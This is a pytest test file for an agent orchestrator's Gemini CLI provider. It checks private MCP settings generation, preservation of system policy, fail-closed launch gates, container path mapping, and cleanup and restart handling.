def test_gemini_persists_the_stable_mcp_launcher_in_its_private_settings(tmp_path):
    """A settings file that survives a restart must use persisted MCP resolution."""
    profile = AgentProfile(
        name="reviewer",
        description="Review changes.",
        mcpServers={"cao-orchestrator": {"command": "/opt/cao/bin/cao-mcp-server"}},
    )
    provider = _provider(agent_profile="reviewer")
    resolved = {"command": "/usr/local/bin/cao-mcp-server", "args": ["--stdio"]}

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.resolve_mcp_server_config",
            return_value=resolved,
        ) as resolve,
    ):
        settings_path = provider._write_runtime_settings(profile)

    resolve.assert_called_once_with({"command": "/opt/cao/bin/cao-mcp-server"}, persisted=True)
    settings = json.loads(settings_path.read_text(encoding="utf-8"))
    assert settings["mcpServers"]["cao-orchestrator"]["command"] == "/usr/local/bin/cao-mcp-server"


def test_gemini_private_settings_preserve_system_policy_but_replace_ambient_mcp(tmp_path):
    """The private override keeps non-MCP policy while preventing ambient server leakage."""
    system_policy = {
        "security": {"disableYoloMode": False, "auditMode": "strict"},
        "tools": {"allowed": ["read_file"], "blocked": ["shell"]},
        "telemetry": {"enabled": True, "endpoint": "https://audit.example.invalid"},
        "extensions": {"keep-system-extension": True},
        "mcp": {"allowed": ["ambient-server", "cao-orchestrator"], "enabled": True},
        "mcpServers": {
            "ambient-server": {
                "command": "/usr/local/bin/ambient-mcp",
                "env": {"AMBIENT_SECRET": "must-not-leak"},
            }
        },
    }
    profile = AgentProfile(
        name="reviewer",
        description="Review changes.",
        mcpServers={
            "cao-orchestrator": {
                "command": "/opt/cao/bin/cao-mcp-server",
                "args": ["--stdio"],
            }
        },
    )
    provider = _provider(agent_profile="reviewer")

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        patch.object(provider, "_read_system_policy", return_value=system_policy),
    ):
        settings_path = provider._write_runtime_settings(profile)

    settings = json.loads(settings_path.read_text(encoding="utf-8"))
    assert settings["security"] == system_policy["security"]
    assert settings["tools"] == system_policy["tools"]
    assert settings["telemetry"] == system_policy["telemetry"]
    assert settings["extensions"] == system_policy["extensions"]
    assert settings["mcp"]["enabled"] is True
    assert settings["mcp"]["allowed"] == ["cao-orchestrator"]
    assert set(settings["mcpServers"]) == {"cao-orchestrator"}
    assert "ambient-server" not in settings["mcpServers"]
    assert "must-not-leak" not in settings_path.read_text(encoding="utf-8")
    # The source policy is a separate immutable input, never rewritten by CAO.
    assert set(system_policy["mcpServers"]) == {"ambient-server"}
    assert system_policy["mcp"]["allowed"] == ["ambient-server", "cao-orchestrator"]


def test_gemini_rejects_administrator_required_mcp_before_creating_private_settings(tmp_path):
    """An opaque admin MCP could carry credentials outside CAO's profile contract."""
    provider = _provider()
    system_policy = {
        "admin": {
            "mcp": {
                "requiredConfig": {
                    "corp": {
                        "command": "/opt/corp-mcp",
                        "env": {"TOKEN": "literal-secret"},
                    }
                }
            }
        }
    }

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        patch.object(provider, "_read_system_policy", return_value=system_policy),
        pytest.raises(ProviderError, match="admin.mcp.requiredConfig"),
    ):
        provider._write_runtime_settings(None)

    assert not (tmp_path / "cao" / "providers").exists()


def test_gemini_rejects_administrator_mcp_config_before_creating_private_settings(tmp_path):
    """CAO cannot claim a profile-only contract around admin overrides yet."""
    provider = _provider()
    system_policy = {
        "admin": {"mcp": {"config": {"corp": {"command": "/opt/corp-mcp", "args": ["--stdio"]}}}}
    }

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        patch.object(provider, "_read_system_policy", return_value=system_policy),
        pytest.raises(ProviderError, match="admin.mcp.config"),
    ):
        provider._write_runtime_settings(None)

    assert not (tmp_path / "cao" / "providers").exists()


def test_gemini_rejects_disabled_system_mcp_before_creating_private_settings(tmp_path):
    """An overlay cannot claim coordination tools while policy disables them."""
    provider = _provider()

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        patch.object(provider, "_read_system_policy", return_value={"mcp": {"enabled": False}}),
        pytest.raises(ProviderError, match="policy disables MCP servers"),
    ):
        provider._write_runtime_settings(None)

    assert not (tmp_path / "cao" / "providers").exists()


def test_gemini_rejects_system_mcp_allowlist_with_different_alias_casing(tmp_path):
    """Gemini's effective allowlist needs the exact emitted profile alias."""
    provider = _provider()
    profile = AgentProfile(
        name="reviewer",
        description="Review changes.",
        mcpServers={"cao-orchestrator": {"command": "/opt/cao/bin/cao-mcp-server"}},
    )

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        patch.object(
            provider,
            "_read_system_policy",
            return_value={"mcp": {"allowed": ["CAO-ORCHESTRATOR"]}},
        ),
        pytest.raises(ProviderError, match="does not permit CAO profile servers"),
    ):
        provider._write_runtime_settings(profile)

    assert not (tmp_path / "cao" / "providers").exists()


def test_gemini_rejects_system_mcp_exclusion_for_profile_alias_before_runtime(tmp_path):
    """An excluded CAO alias would otherwise launch Gemini without its tools."""
    provider = _provider()
    profile = AgentProfile(
        name="reviewer",
        description="Review changes.",
        mcpServers={"cao-orchestrator": {"command": "/opt/cao/bin/cao-mcp-server"}},
    )

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        patch.object(
            provider,
            "_read_system_policy",
            return_value={"mcp": {"excluded": ["CAO-ORCHESTRATOR"]}},
        ),
        pytest.raises(ProviderError, match="MCP exclusion blocks"),
    ):
        provider._write_runtime_settings(profile)

    assert not (tmp_path / "cao" / "providers").exists()


def test_gemini_system_policy_disabling_yolo_fails_before_terminal_launch():
    """An enterprise policy forbidding YOLO must prevent CAO from sending a command."""
    provider = _provider()
    backend = MagicMock()

    with (
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.wait_for_shell",
            new=AsyncMock(return_value=True),
        ),
        patch.object(
            provider,
            "_read_system_policy",
            return_value={"security": {"disableYoloMode": True}},
        ),
        patch("cli_agent_orchestrator.providers.gemini_cli.get_backend", return_value=backend),
    ):
        with pytest.raises(ProviderError, match="disables YOLO mode"):
            asyncio.run(provider.initialize())

    backend.send_keys.assert_not_called()


@pytest.mark.parametrize("allowed_tools", [[], ["fs_read"]], ids=["empty", "restricted"])
def test_gemini_restrictive_tool_allowlist_fails_closed_before_cli_launch(allowed_tools):
    """Prompt text is not native enforcement, so a restricted Gemini profile cannot start."""
    provider = _provider(allowed_tools=allowed_tools)
    backend = MagicMock()

    with (
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.wait_for_shell",
            new=AsyncMock(return_value=True),
        ),
        patch.object(
            provider,
            "_wait_for_bootstrap_ready",
            new=AsyncMock(return_value=TerminalStatus.IDLE),
        ),
        patch("cli_agent_orchestrator.providers.gemini_cli.get_backend", return_value=backend),
    ):
        with pytest.raises(ProviderError):
            asyncio.run(provider.initialize())

    backend.send_keys.assert_not_called()


def test_gemini_profile_tool_allowlist_is_subject_to_the_same_fail_closed_gate():
    """A child cannot bypass the policy by moving a restrictive list into its profile."""
    profile = AgentProfile(
        name="restricted-reviewer",
        description="Review only.",
        allowedTools=[],
    )
    provider = _provider(agent_profile="restricted-reviewer")
    backend = MagicMock()

    with (
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.wait_for_shell",
            new=AsyncMock(return_value=True),
        ),
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.load_agent_profile_unresolved",
            return_value=profile,
        ),
        patch.object(
            provider,
            "_wait_for_bootstrap_ready",
            new=AsyncMock(return_value=TerminalStatus.IDLE),
        ),
        patch("cli_agent_orchestrator.providers.gemini_cli.get_backend", return_value=backend),
    ):
        with pytest.raises(ProviderError):
            asyncio.run(provider.initialize())

    backend.send_keys.assert_not_called()


@pytest.mark.parametrize("allowed_tools", [None, ["*"]], ids=["no-allowlist", "wildcard"])
def test_gemini_unrestricted_tool_policy_can_launch(allowed_tools):
    """The fail-closed gate must not reject an explicitly unrestricted worker."""
    provider = _launchable_provider(allowed_tools=allowed_tools)
    backend = MagicMock()

    with (
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.wait_for_shell",
            new=AsyncMock(return_value=True),
        ),
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.load_agent_profile_unresolved",
            return_value=_profile_with_private_mcp(),
        ),
        patch.object(
            provider,
            "_wait_for_bootstrap_ready",
            new=AsyncMock(return_value=TerminalStatus.IDLE),
        ),
        patch("cli_agent_orchestrator.providers.gemini_cli.get_backend", return_value=backend),
    ):
        assert asyncio.run(provider.initialize()) is True

    backend.send_keys.assert_called_once()


def test_gemini_ambiguous_launch_transport_keeps_private_runtime_for_reconciliation():
    """A tmux error after a launch paste cannot trigger private-runtime cleanup."""
    provider = _launchable_provider()
    backend = MagicMock()
    backend.send_keys.side_effect = OSError("tmux disconnected after launch paste")

    with (
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.wait_for_shell",
            new=AsyncMock(return_value=True),
        ),
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.load_agent_profile_unresolved",
            return_value=_profile_with_private_mcp(),
        ),
        patch("cli_agent_orchestrator.providers.gemini_cli.get_backend", return_value=backend),
        pytest.raises(TerminalInputBlockedError, match="may have reached") as exc_info,
    ):
        asyncio.run(provider.initialize())

    assert exc_info.value.action == "reconcile"
    assert exc_info.value.delivery_may_have_occurred is True
    assert provider._runtime_settings_path is not None
    assert provider._runtime_settings_path.is_file()
    backend.send_keys.assert_called_once()


def test_gemini_publishes_a_direct_waiting_observation_before_deferred_task_delivery():
    """A trust/login dialog must be visible to the common monitor immediately."""
    provider = _provider()
    backend = MagicMock()
    backend.get_history.return_value = "Do you trust this workspace?\nPress enter to continue"

    with (
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.wait_for_shell",
            new=AsyncMock(return_value=True),
        ),
        patch.object(provider, "_build_gemini_command", return_value="gemini -i bootstrap"),
        patch("cli_agent_orchestrator.providers.gemini_cli.get_backend", return_value=backend),
        patch("cli_agent_orchestrator.services.status_monitor.status_monitor") as monitor,
    ):
        assert asyncio.run(provider.initialize()) is True

    monitor.publish_observed_status.assert_called_once_with(
        "gemini-terminal", TerminalStatus.WAITING_USER_ANSWER
    )


def test_gemini_command_exports_its_private_mcp_settings_path(tmp_path, monkeypatch):
    """The interactive process receives the private settings path, not a global one."""
    profile = AgentProfile(
        name="reviewer",
        description="Review changes.",
        mcpServers={"cao-orchestrator": {"command": "/opt/cao/bin/cao-mcp-server"}},
    )
    provider = _provider(agent_profile="reviewer")
    monkeypatch.delenv("GEMINI_CLI_SYSTEM_SETTINGS_PATH", raising=False)

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.load_agent_profile_unresolved",
            return_value=profile,
        ),
        patch.object(provider, "_read_system_policy", return_value={}),
    ):
        argv = _argv(provider)

    settings_env = next(
        part for part in argv if part.startswith("GEMINI_CLI_SYSTEM_SETTINGS_PATH=")
    )
    settings_path = settings_env.removeprefix("GEMINI_CLI_SYSTEM_SETTINGS_PATH=")
    expected_suffix = (
        "/providers/gemini_cli/" + hashlib.sha256(b"gemini-terminal").hexdigest() + "/settings.json"
    )
    assert settings_path.endswith(expected_suffix)
    assert "/.gemini/" not in settings_path


def test_gemini_command_maps_private_settings_path_into_its_container(tmp_path, monkeypatch):
    """A containerized worker must receive its guest settings path, never the host path."""
    host_cao_home = tmp_path / "cao-host"
    profile = AgentProfile(
        name="container-reviewer",
        description="Review changes from inside the worker container.",
        mcpServers={"cao-orchestrator": {"command": "/opt/cao/bin/cao-mcp-server"}},
        container=ContainerConfig(
            path_maps=[
                ContainerPathMap(host=str(host_cao_home), guest="/cao-runtime"),
                # This executable is intentionally a container-visible mount;
                # declaring even an identity map proves it is not an ambient
                # host path silently copied into Gemini's private settings.
                ContainerPathMap(host="/opt/cao", guest="/opt/cao"),
            ]
        ),
    )
    provider = _provider(agent_profile="container-reviewer")
    monkeypatch.delenv("GEMINI_CLI_SYSTEM_SETTINGS_PATH", raising=False)

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", host_cao_home),
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.load_agent_profile_unresolved",
            return_value=profile,
        ),
        patch.object(provider, "_read_system_policy", return_value={}),
    ):
        argv = _argv(provider)

    settings_env = next(
        part for part in argv if part.startswith("GEMINI_CLI_SYSTEM_SETTINGS_PATH=")
    )
    settings_path = settings_env.removeprefix("GEMINI_CLI_SYSTEM_SETTINGS_PATH=")
    expected_path = (
        "/cao-runtime/providers/gemini_cli/"
        + hashlib.sha256(b"gemini-terminal").hexdigest()
        + "/settings.json"
    )
    assert settings_path == expected_path
    assert str(host_cao_home) not in settings_path


def test_gemini_container_profile_without_a_private_settings_map_fails_closed(
    tmp_path, monkeypatch
):
    """A guest must never receive an inaccessible host settings path silently."""
    profile = AgentProfile(
        name="container-reviewer",
        description="Review from a container.",
        mcpServers={"cao-orchestrator": {"command": "cao-mcp-server"}},
        container=ContainerConfig(
            path_maps=[ContainerPathMap(host="/some-other-host-path", guest="/other")]
        ),
    )
    provider = _provider(agent_profile="container-reviewer")
    monkeypatch.delenv("GEMINI_CLI_SYSTEM_SETTINGS_PATH", raising=False)

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao-host"),
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.load_agent_profile_unresolved",
            return_value=profile,
        ),
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.resolve_mcp_server_config",
            return_value={"command": "cao-mcp-server"},
        ),
        patch.object(provider, "_read_system_policy", return_value={}),
        pytest.raises(ProviderError, match="no path map for private Gemini settings"),
    ):
        provider._build_gemini_command()

    runtime_dir = (
        tmp_path
        / "cao-host"
        / "providers"
        / "gemini_cli"
        / hashlib.sha256(b"gemini-terminal").hexdigest()
    )
    assert not runtime_dir.exists()


def test_gemini_without_profile_mcp_fails_closed_until_deny_all_is_verified():
    """An empty `mcp.allowed` is not proven to block ambient Gemini scopes."""
    with pytest.raises(ProviderError, match="requires at least one profile MCP server"):
        _argv(_provider())


def test_manager_restart_restores_an_active_gemini_turn_only_from_private_receipt_store():
    """Agent-editable metadata cannot invent or replace a pending turn receipt."""
    manager = ProviderManager()
    restored = MagicMock(spec=GeminiCliProvider)
    restored.requires_turn_receipt = True
    private_receipt = {
        "generation": "1" * 32,
        "receipt_sha256": "a" * 64,
        "phase": "sent",
    }

    with (
        patch(
            "cli_agent_orchestrator.providers.manager.get_terminal_metadata",
            return_value={
                "provider": "gemini_cli",
                "tmux_session": "session",
                "tmux_window": "window",
                "agent_profile": "reviewer",
                # This deliberately plausible document must remain inert.
                "turn_receipt": {
                    "generation": "f" * 32,
                    "receipt_sha256": "d" * 64,
                    "phase": "sent",
                },
            },
        ),
        patch("cli_agent_orchestrator.providers.manager.GeminiCliProvider", return_value=restored),
        patch(
            "cli_agent_orchestrator.providers.manager.get_terminal_turn_receipt",
            return_value=private_receipt,
        ) as get_receipt,
    ):
        assert manager.get_provider("gemini-restarted") is restored

    get_receipt.assert_called_once_with("gemini-restarted")
    restored.restore_turn_receipt_state.assert_called_once_with(private_receipt)


def test_manager_restart_cleanup_restores_the_private_gemini_runtime_handle():
    """A server restart cannot leave a Gemini terminal's settings overlay behind."""
    manager = ProviderManager()
    restored = MagicMock(spec=GeminiCliProvider)

    with (
        patch(
            "cli_agent_orchestrator.providers.manager.get_terminal_metadata",
            return_value={
                "provider": "gemini_cli",
                "tmux_session": "session",
                "tmux_window": "window",
                "agent_profile": "reviewer",
            },
        ),
        patch(
            "cli_agent_orchestrator.providers.manager.GeminiCliProvider", return_value=restored
        ) as provider_class,
    ):
        assert manager.cleanup_provider("deadbeef") is True

    provider_class.assert_called_once_with("deadbeef", "session", "window", "reviewer")
    restored.cleanup.assert_called_once_with()


def test_gemini_cleanup_failure_keeps_the_private_runtime_retryable(tmp_path):
    """A failed private-settings removal must retain the exact retry handle."""
    provider = _provider()
    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        patch.object(provider, "_read_system_policy", return_value={}),
    ):
        settings_path = provider._write_runtime_settings(_profile_with_private_mcp())
        with patch(
            "cli_agent_orchestrator.providers.gemini_cli.shutil.rmtree",
            side_effect=OSError("runtime is busy"),
        ):
            assert provider.cleanup() is False

    assert settings_path.exists()
    assert provider._runtime_dir == settings_path.parent
    assert provider._runtime_settings_path == settings_path


def test_manager_restart_gemini_cleanup_failure_returns_false_for_terminal_retention():
    """After restart, failed Gemini cleanup must preserve the DB row for retry."""
    manager = ProviderManager()
    restored = MagicMock(spec=GeminiCliProvider)
    restored.cleanup.return_value = False

    with (
        patch(
            "cli_agent_orchestrator.providers.manager.get_terminal_metadata",
            return_value={
                "provider": "gemini_cli",
                "tmux_session": "session",
                "tmux_window": "window",
                "agent_profile": "reviewer",
            },
        ),
        patch("cli_agent_orchestrator.providers.manager.GeminiCliProvider", return_value=restored),
    ):
        assert manager.cleanup_provider("deadbeef") is False

    restored.cleanup.assert_called_once_with()


def test_assign_can_spawn_a_gemini_child_with_an_explicit_model(monkeypatch):
    """The generic child path accepts Gemini and preserves the child model request."""
    from cli_agent_orchestrator.utils import orchestration

    metadata = MagicMock()
    metadata.json.return_value = {
        "provider": "codex",
        "session_name": "cao-session",
        "allowed_tools": None,
    }
    metadata.raise_for_status.return_value = None
    created = MagicMock()
    created.json.return_value = {"id": "gemini-child", "provider": "gemini_cli"}
    created.raise_for_status.return_value = None
    requests = MagicMock()
    requests.get.return_value = metadata
    requests.post.return_value = created

    monkeypatch.setattr(orchestration, "requests", requests)
    monkeypatch.setattr(orchestration, "resolve_provider", lambda *_args, **_kwargs: "gemini_cli")
    monkeypatch.setattr(
        orchestration, "_resolve_child_allowed_tools", lambda *_args, **_kwargs: None
    )
    monkeypatch.setenv("CAO_TERMINAL_ID", "c0dec0de")

    child_id, provider = orchestration._create_terminal("reviewer", "/repo", model="gemini-2.5-pro")

    assert (child_id, provider) == ("gemini-child", "gemini_cli")
    params = requests.post.call_args.kwargs["params"]
    assert params["provider"] == "gemini_cli"
    assert params["model"] == "gemini-2.5-pro"


def test_run_step_accepts_gemini_child_and_forwards_model(client):
    """The native one-shot child route must not special-case legacy providers."""
    result = AgentStepResult(
        terminal_id="gemini-child",
        last_message="review complete",
        status=TerminalStatus.COMPLETED,
    )
    with patch(
        "cli_agent_orchestrator.api.main.run_agent_step", new=AsyncMock(return_value=result)
    ) as run_step:
        response = client.post(
            TERMINALS_RUN_STEP_ROUTE,
            json={
                "provider": "gemini_cli",
                "agent": "reviewer",
                "prompt": "Review the candidate.",
                "model": "gemini-2.5-pro",
            },
        )

    assert response.status_code == 200
    assert run_step.await_args.kwargs["provider"] == "gemini_cli"
    assert run_step.await_args.kwargs["model"] == "gemini-2.5-pro"
